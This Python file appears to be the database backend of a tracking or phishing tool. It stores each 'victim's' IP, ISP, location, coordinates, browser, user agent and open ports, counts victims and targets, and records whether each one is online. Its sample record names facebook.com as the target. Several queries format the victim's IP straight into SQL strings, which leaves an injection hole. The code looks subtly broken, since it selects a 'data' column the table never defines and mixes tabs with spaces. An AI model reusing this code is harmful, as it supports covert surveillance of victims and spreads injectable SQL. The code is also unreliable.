import sys
import os
import random
import sqlite3
import json
import collections
from core.generals import generals

class dbMgm(object):
    def __init__(self):		
        self.conn = sqlite3.connect(os.getcwd() + "/logs/" + 'db.sqlite3')
        self.cursor = self.conn.cursor() 
        
    def createLogTable(self):
        self.cursor.execute('''CREATE TABLE log(status text, date text,
		                    time text, endpoint text, target text, ip text, isp text,  country text,
		                    city text, latitude text, longitude text, os text,  browser text,
		                    browserVersion text, useragent text, requests text, ports text)''') 
        self.conn.commit()
    
    def query(self, arg):
        self.cursor.execute(arg)
        self.conn.commit()
        return self.cursor

    def getAll(self):
        self.cursor.execute('''select  count(ip) AS requests, data,status ,date , time ,endpoint ,target ,ip ,isp , country ,
		                    city ,latitude ,longitude ,os , browser ,
		                    browserVersion ,useragent ,requests , ports  from log GROUP BY ip ORDER BY date ASC ''')
        
        rows = self.cursor.fetchall()
        columns = [desc[0] for desc in self.cursor.description]
        result = []
        for row in rows:
            row = dict(zip(columns, row))
	    requests = self.getScalar("SELECT count(*) FROM log where ip='%s'" % row['ip'])
            row['requests'] = requests or 0
            row['id'] = self.randomHash()           
            row['data'] = row['data'] or "" 
            result.append(row)
        return json.dumps( result ) 

    def randomHash(self):
        hasher = random.randint(0, 999)
        return hasher

    def getAll2(self):
        self.cursor.execute('''select data,status ,date , time ,endpoint ,target ,ip ,isp , country ,
		                    city ,latitude ,longitude ,os , browser ,
		                    browserVersion ,useragent ,requests , ports  from log ORDER BY date ASC ''')
        
        rows = self.cursor.fetchall()
        columns = [desc[0] for desc in self.cursor.description]
        result = []
        for row in rows:
            row = dict(zip(columns, row))
            requests = self.getScalar("SELECT count(*) FROM log where ip='%s'" % row['ip'])
            row['id'] = self.randomHash()
            row['requests'] = requests or 0            
            row['data'] = row['data'] or ""		
            result.append(row)
        return json.dumps( result ) 
        
    def getStats(self):
        online = self.getScalar("SELECT count(distinct(status)) from log")
        victims = self.getScalar("SELECT count(distinct(ip)) from log")
        locations = self.getScalar("SELECT count(distinct(country)) from log")
        target = self.getScalar("SELECT count(distinct(target)) from log")
        requests = self.getScalar("SELECT count(*) FROM log") 
        result = {
	   "online": online,
	   "victims": victims,
	   "locations": locations,
	   "targets": target,
	   "requests": requests
	}
        return json.dumps( result )  
        
    def storeLog(self, my_dict): 
        columns = ', '.join(my_dict.keys())
        placeholders = ':'+', :'.join(my_dict.keys())
        query = 'INSERT INTO log (%s) VALUES (%s)' % (columns, placeholders) 
        self.cursor.execute(query, my_dict)
        self.conn.commit()
        return
    
    def isNewVictim(self, ipVictim):
        r = self.cursor.execute("SELECT EXISTS(SELECT 1 FROM log WHERE ip='%s')" % ipVictim)
	r = r.fetchone()[0] 
        if int(r) == True:
	  return False
        return True 
    
    def ping(self, ipVictim):
        r = self.cursor.execute("update log set status = 'online'  WHERE ip='%s'" % ipVictim)
        self.conn.commit()
        return True 
    
    def pong(self, ipVictim):
        r = self.cursor.execute("update log set status = 'offline'  WHERE ip='%s'" % ipVictim)
        self.conn.commit()
        return True 

    def getScalar(self, query):
        r = self.cursor.execute(query)
	return r.fetchone()[0]
    
    def storeLogDummyData(self):
        self.storeLog({   
                        "status": "online",
                        "date": "22/05/14",
                        "time": "10:59:35",
                        "endpoint": "localhost:8080", 
                        "target": "facebook.com",
                        "ip": "177.77.77.77",
                        "isp": "Telmex Colombia S.A.",
                        "country": "Panama",
                        "city": "Neiva",
                        "latitude": "4.7000",
                        "longitude": "-24.0222",
                        "os": "linux",
                        "browser": "chrome",
                        "browserVersion": "52.0.2743.116",
                        "useragent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
                        "requests": 2,
                        "ports": "80, 21, 3389"
                      })

    def __del__(self):
        self.conn.close()
